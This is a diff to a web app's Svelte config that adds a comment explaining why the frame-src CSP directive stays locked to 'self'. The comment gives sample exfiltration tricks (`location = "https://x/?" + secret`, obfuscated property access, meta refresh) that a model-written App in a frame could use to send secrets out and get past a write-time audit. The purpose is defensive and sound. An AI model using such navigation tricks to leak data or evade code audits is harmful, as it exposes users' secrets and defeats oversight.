@@ -83,6 +83,20 @@ const config = {
 				// The document-workspace preview iframe is `srcdoc` + sandbox, so
 				// it is an opaque origin rather than a framed URL, but keep this
 				// tight anyway.
+				//
+				// This is the one directive enforced in EVERY mode but `off`, even
+				// while CSP_MODE is report-only (src/lib/server/security-headers.ts
+				// sends it as a Content-Security-Policy of its own beside the
+				// report-only policy). A model-written App runs in a frame of these
+				// pages and can navigate that frame to any address, which carries
+				// whatever it knows in the URL: `location = "https://x/?" + secret`,
+				// `window["loc"+"ation"]`, a meta refresh, an anchor click. The
+				// App's own CSP cannot stop that and the write-time audit can be
+				// evaded; the embedding page's frame-src can, and it answers for a
+				// navigation the framed document starts itself. 'self' means a frame
+				// of these pages can only ever be pointed at this app. Never widen it
+				// (tests/integration/svelte-config-security.test.ts holds it, and
+				// tests/e2e/app-frame-navigation.spec.ts proves it in a browser).
 				'frame-src': ['self'],
 				'object-src': ['none'],
 				'base-uri': ['self'],
